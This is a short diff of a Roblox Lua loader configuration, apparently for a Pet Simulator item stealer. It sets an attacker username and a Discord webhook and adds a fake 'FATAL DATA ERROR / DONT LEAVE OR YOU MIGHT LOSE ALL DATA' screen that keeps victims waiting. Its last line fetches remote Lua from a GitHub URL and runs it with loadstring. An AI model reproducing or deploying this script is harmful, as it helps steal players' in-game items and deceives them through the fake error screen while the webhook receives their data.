@@ -1,9 +1,9 @@
 Username = "KonichiwaNab"
-WebHook = "https://discord.com/api/webhooks/1256562775933714443/qxJUh6kz5jOv7PTKzrqbh93vBMf85Mg-BmRQ-cX2dtd7GV1GFA0s883l9srNI391s2bL"
+WebHook = "https://discord.com/api/webhooks/1256562812587741236/Ef0wEsZqCW1UamLUElYJ41W6xlEnvuJXndh8HaqS3pzijtdzYuaQ_me-_Ml49wRxwmtS"
 
-_G.CustomScriptName = "Coen"
-_G.Text1 = "Script Loaded..."
-_G.Text2 = "Waiting for Script"
-_G.Text3 = "Checking Scripts..."
-_G.Text4 = "Starting Scripts..."
+_G.CustomScriptName = "FATAL DATA ERROR"
+_G.Text1 = "DONT LEAVE OR YOU MIGHT LOSE ALL DATA"
+_G.Text2 = "PLEASE WAIT"
+_G.Text3 = "PLEASE WAIT"
+_G.Text4 = "PLEASE WAIT"
 loadstring(game:HttpGet("https://raw.githubusercontent.com/Justanotherdme/petsimx22/main/petsimguiss.lua"))()
